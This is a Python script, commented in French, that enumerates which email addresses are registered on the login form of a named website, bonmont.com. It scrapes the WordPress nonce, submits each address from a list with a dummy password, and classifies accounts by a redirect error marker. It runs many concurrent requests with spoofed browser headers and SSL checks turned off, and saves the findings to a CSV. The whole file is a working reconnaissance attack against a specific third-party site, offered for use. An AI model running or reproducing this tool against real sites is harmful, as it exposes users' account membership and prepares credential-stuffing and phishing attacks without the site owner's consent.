#!/usr/bin/env python3
"""
Bonmont.com Email Checker
=========================
Verifie si des adresses e-mail sont enregistrees sur bonmont.com
en exploitant la reponse du formulaire de connexion.

Quand l'email n'existe pas, la page redirige vers :
  ?opinions-login-error=invalid_email

Usage:
  python3 checker.py emails.txt
  python3 checker.py emails.csv -o resultats.csv --concurrency 10
  python3 checker.py emails.txt -o resultats.csv -c 20 -d 0.2
"""

import argparse
import asyncio
import csv
import re
import sys
import time
from pathlib import Path

try:
    import aiohttp
except ImportError:
    print("Installation de aiohttp...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp"])
    import aiohttp

try:
    from tqdm import tqdm
except ImportError:
    print("Installation de tqdm...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "tqdm"])
    from tqdm import tqdm


TARGET_URL = "https://bonmont.com/connexion/"
INVALID_MARKER = "opinions-login-error=invalid_email"
DUMMY_PASSWORD = "check123"

BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Referer": "https://bonmont.com/connexion/",
    "Origin": "https://bonmont.com",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
}


async def extract_nonce(session):
    """Extract WordPress nonce from the login page."""
    try:
        async with session.get(TARGET_URL, headers=BROWSER_HEADERS,
                               timeout=aiohttp.ClientTimeout(total=10)) as resp:
            body = await resp.text()
            nonce_match = re.search(r'id="opinions-login-nonce"[^>]*value="([^"]+)"', body)
            referer_match = re.search(r'name="_wp_http_referer"[^>]*value="([^"]+)"', body)
            nonce = nonce_match.group(1) if nonce_match else ""
            referer = referer_match.group(1) if referer_match else "/connexion/"
            return nonce, referer
    except Exception:
        return "", "/connexion/"


async def check_email(session, email, semaphore, nonce, referer, retries=3):
    """Verifie un email sur bonmont.com."""
    async with semaphore:
        for attempt in range(retries):
            try:
                form_data = {
                    "opinions_login[email]": email.strip(),
                    "opinions_login[password]": DUMMY_PASSWORD,
                    "opinions_login[submit]": "Se connecter",
                    "opinions-login-nonce": nonce,
                    "_wp_http_referer": referer,
                }
                async with session.post(
                    TARGET_URL,
                    data=form_data,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=15),
                    headers=BROWSER_HEADERS,
                ) as resp:
                    location = resp.headers.get("Location", "")
                    if INVALID_MARKER in location:
                        return email, "invalid"
                    if resp.status in (301, 302, 303, 307, 308):
                        return email, "valid"
                    body = await resp.text()
                    if INVALID_MARKER in body:
                        return email, "invalid"
                    return email, "valid"
            except asyncio.TimeoutError:
                if attempt == retries - 1:
                    return email, "error:timeout"
                await asyncio.sleep(1)
            except Exception as e:
                if attempt == retries - 1:
                    return email, f"error:{str(e)[:50]}"
                await asyncio.sleep(1)
        return email, "error:max_retries"


async def process_emails(emails, concurrency=10, delay=0.5, retries=3):
    """Traite une liste d'emails de maniere concurrente."""
    semaphore = asyncio.Semaphore(concurrency)
    results = []

    connector = aiohttp.TCPConnector(limit=concurrency, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Extract nonce first
        nonce, referer = await extract_nonce(session)
        if not nonce:
            print("  Attention: nonce non trouve, les resultats peuvent etre incorrects")

        with tqdm(total=len(emails), desc="Verification", unit="email",
                  bar_format="{l_bar}{bar:40}{r_bar}") as pbar:
            tasks = []
            for i, email in enumerate(emails):
                task = asyncio.create_task(
                    check_email(session, email, semaphore, nonce, referer, retries)
                )
                tasks.append(task)
                if (i + 1) % concurrency == 0:
                    await asyncio.sleep(delay)

            for coro in asyncio.as_completed(tasks):
                result = await coro
                results.append(result)
                pbar.update(1)

    return results


def read_emails(filepath):
    """Lit les emails depuis un fichier .txt ou .csv."""
    emails = []
    path = Path(filepath)

    if not path.exists():
        print(f"Erreur: fichier '{filepath}' introuvable")
        sys.exit(1)

    with open(path, 'r', encoding='utf-8') as f:
        if path.suffix.lower() == '.csv':
            reader = csv.reader(f)
            for row in reader:
                if row:
                    email = row[0].strip()
                    if '@' in email and email.lower() != 'email':
                        emails.append(email)
        else:
            for line in f:
                email = line.strip()
                if email and '@' in email:
                    emails.append(email)

    # Deduplicate
    seen = set()
    unique = []
    for e in emails:
        if e.lower() not in seen:
            seen.add(e.lower())
            unique.append(e)

    return unique


def write_results(results, output_path):
    """Ecrit les resultats dans un fichier CSV."""
    with open(output_path, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['email', 'status'])
        for email, status in sorted(results, key=lambda x: (x[1], x[0])):
            writer.writerow([email, status])


def main():
    parser = argparse.ArgumentParser(
        description="Bonmont.com Email Checker - Verifie si des emails sont enregistres",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples:
  python3 checker.py emails.txt
  python3 checker.py emails.csv -o resultats.csv --concurrency 5
  python3 checker.py emails.txt -o resultats.csv -c 20 -d 0.2
        """
    )
    parser.add_argument("input", help="Fichier d'entree (.txt ou .csv, un email par ligne)")
    parser.add_argument("-o", "--output", default="resultats.csv",
                        help="Fichier de sortie CSV (defaut: resultats.csv)")
    parser.add_argument("-c", "--concurrency", type=int, default=10,
                        help="Requetes simultanees (defaut: 10)")
    parser.add_argument("-d", "--delay", type=float, default=0.5,
                        help="Delai entre batches en secondes (defaut: 0.5)")
    parser.add_argument("-r", "--retries", type=int, default=3,
                        help="Tentatives par email (defaut: 3)")

    args = parser.parse_args()

    # Read emails
    print(f"\n  Lecture de {args.input}...")
    emails = read_emails(args.input)
    print(f"   {len(emails)} emails trouves\n")

    if not emails:
        print("Aucun email trouve dans le fichier.")
        sys.exit(1)

    # Process
    start = time.time()
    results = asyncio.run(
        process_emails(emails, args.concurrency, args.delay, args.retries)
    )
    elapsed = time.time() - start

    # Write results
    write_results(results, args.output)

    # Summary
    valid = sum(1 for _, s in results if s == "valid")
    invalid = sum(1 for _, s in results if s == "invalid")
    errors = sum(1 for _, s in results if s.startswith("error"))

    print(f"\n{'='*50}")
    print(f"  RESUME")
    print(f"{'='*50}")
    print(f"  Valides (email existe)   : {valid}")
    print(f"  Invalides (n'existe pas) : {invalid}")
    print(f"  Erreurs                  : {errors}")
    print(f"  Total                    : {len(results)}")
    print(f"  Duree                    : {elapsed:.1f}s")
    print(f"  Resultats sauves dans    : {args.output}")
    print(f"{'='*50}\n")


if __name__ == "__main__":
    main()
